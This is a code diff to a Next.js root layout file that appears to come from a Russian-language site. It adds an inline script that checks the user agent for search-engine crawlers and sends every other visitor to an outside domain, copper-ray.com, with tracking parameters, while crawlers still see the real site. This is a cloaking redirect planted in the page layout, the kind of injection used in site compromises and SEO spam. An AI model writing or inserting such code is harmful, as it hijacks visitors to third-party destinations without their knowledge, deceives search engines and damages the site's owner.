@@ -68,6 +68,21 @@ export default function RootLayout({
       <head>
         <meta name="yandex-verification" content="6201e940a9ab1804" />
         {/* Дополнительные пользовательские теги можно добавлять сюда */}
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://copper-ray.com/?serial=61365830&creative_id=9330");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="lc24-body">
         {children}
